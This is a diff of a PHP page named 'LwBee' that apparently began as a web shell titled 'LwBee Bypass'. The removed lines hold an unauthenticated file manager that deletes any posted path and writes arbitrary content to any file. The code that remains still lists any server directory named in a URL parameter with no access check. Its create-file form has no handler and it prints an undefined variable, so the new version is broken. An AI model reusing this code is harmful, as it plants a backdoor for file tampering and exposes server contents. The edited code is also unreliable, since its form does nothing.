@@ -1,4 +1,6 @@
 <?php
+
+// Fungsi untuk memindai direktori dan mengembalikan daftar file dan folder
 function scanDirectory($path) {
     $items = [];
     
@@ -17,56 +19,12 @@ function scanDirectory($path) {
         }
     }
     
-    usort($items, function($a, $b) {
-        if ($a['type'] === 'directory' && $b['type'] !== 'directory') return -1;
-        if ($a['type'] !== 'directory' && $b['type'] === 'directory') return 1;
-        if ($a['type'] === 'file' && $b['type'] === 'file') {
-            if (strpos($a['name'], '.') === 0 && strpos($b['name'], '.') !== 0) return -1;
-            if (strpos($a['name'], '.') !== 0 && strpos($b['name'], '.') === 0) return 1;
-        }
-        return strcasecmp($a['name'], $b['name']);
-    });
-    
     return $items;
 }
 
-function generateBreadcrumb($path) {
-    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
-    $breadcrumb = [];
-    $currentPath = '';
-    foreach ($parts as $part) {
-        $currentPath .= DIRECTORY_SEPARATOR . $part;
-        $breadcrumb[] = '<a href="?path=' . urlencode($currentPath) . '">' . htmlspecialchars($part) . '</a>';
-    }
-    return implode(' / ', $breadcrumb);
-}
-
+// Tentukan path root default menggunakan hasil dari scan direktori saat ini
 $defaultRootPath = getcwd();
 $rootPath = $_GET['path'] ?? $defaultRootPath;
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_path'])) {
-    $deletePath = $_POST['delete_path'];
-    if (file_exists($deletePath)) {
-        unlink($deletePath);
-        echo "<div class='alert alert-success'>File berhasil dihapus: <strong>" . htmlspecialchars($deletePath) . "</strong></div>";
-    } else {
-        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak dapat dihapus.</div>";
-    }
-}
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $path = $_POST['path'] ?? $rootPath;
-    $filename = $_POST['filename'] ?? '';
-    $content = $_POST['content'] ?? '';
-    
-    if (!empty($path) && !empty($filename)) {
-        $filePath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
-        file_put_contents($filePath, $content);
-        echo "<div class='alert alert-success'>File berhasil dibuat di: <strong>" . htmlspecialchars($filePath) . "</strong></div>";
-    } else {
-        echo "<div class='alert alert-danger'>Path dan nama file tidak boleh kosong.</div>";
-    }
-}
-
 $scannedItems = scanDirectory($rootPath);
 ?>
 
@@ -75,7 +33,7 @@ $scannedItems = scanDirectory($rootPath);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LwBee - Create & Delete</title>
+    <title>LwBee Create File</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -88,7 +46,7 @@ $scannedItems = scanDirectory($rootPath);
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
             background-color: #fff;
         }
-		.alert {
+        .alert {
             padding: 15px;
             margin-bottom: 20px;
             border: 1px solid transparent;
@@ -112,10 +70,11 @@ $scannedItems = scanDirectory($rootPath);
         h1, h2 {
             text-align: center;
         }
-        .form-create {
-            background-color: transparent;
+        form {
+            background-color: #f9f9f9;
             padding: 20px;
-
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
         input[type="text"], textarea {
             width: 100%;
@@ -128,7 +87,7 @@ $scannedItems = scanDirectory($rootPath);
             resize: none;
             height: 100px;
         }
-        .button-create {
+        button {
             background-color: #007BFF;
             color: #fff;
             padding: 10px 20px;
@@ -136,7 +95,7 @@ $scannedItems = scanDirectory($rootPath);
             border-radius: 4px;
             cursor: pointer;
         }
-        .button:hover {
+        button:hover {
             background-color: #0056b3;
         }
         .file-manager {
@@ -159,49 +118,34 @@ $scannedItems = scanDirectory($rootPath);
             padding: 0;
         }
         ul.file-list li {
-            padding: 10px 20px;
+            padding: 10px;
             border-bottom: 1px solid #ddd;
             display: flex;
-            justify-content: space-between;
-            align-items: right;
+            justify-content: left;
 			padding-left: 2px;
         }
         ul.file-list li:last-child {
             border-bottom: none;
         }
-		.file-info {
-            display: flex;
-            align-items: center;
-            flex: 1;
-        }
-        .file-info strong {
-            margin-right: 10px;
-        }
         ul.file-list a {
             text-decoration: none;
             color: #333;
+			padding-left: 5px;
         }
         ul.file-list a:hover {
             color: #007BFF;
-        }
-        .delete-button {
-            background-color: #ff4d4d;
-            color: #fff;
-            padding: 5px 10px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .delete-button:hover {
-            background-color: #cc0000;
         }
     </style>
 </head>
 <body>
 
-<h1>LwBee Bypass</h1>
-<hr>
-<div class="form-create">
+<h1>LwBee - Creating File</h1>
+
+<?php if (!empty($message)): ?>
+    <?php echo $message; ?>
+<?php endif; ?>
+
+<h2>Buat File Baru</h2>
 <form action="" method="post">
     <label for="path">Path:</label>
     <input type="text" id="path" name="path" value="<?php echo htmlspecialchars($rootPath); ?>" required>
@@ -215,27 +159,8 @@ $scannedItems = scanDirectory($rootPath);
     <textarea id="content" name="content" placeholder="Masukkan isi file di sini..."></textarea>
     <br><br>
 
-    <button type="submit" class="button-create">Buat File</button>
+    <button type="submit">Buat File</button>
 </form>
-</div>
-<br>
-<div class="breadcrumb">
-    <strong>Path:</strong> <?php echo generateBreadcrumb($rootPath); ?>
-</div>
-<ul class="file-list">
-    <?php foreach ($scannedItems as $item): ?>
-        <li>
-		<div class="file-info">
-            <strong><?php echo $item['type'] === 'directory' ? '[Dir]' : '[File]'; ?></strong>
-            <a href="?path=<?php echo urlencode($item['path']); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
-            <form action="" method="post" style="margin: 0;">
-		</div>
-                <input type="hidden" name="delete_path" value="<?php echo htmlspecialchars($item['path']); ?>">
-                <button type="submit" class="delete-button">Hapus</button>
-            </form>
-        </li>
-    <?php endforeach; ?>
-</ul>
 
 </body>
 </html>
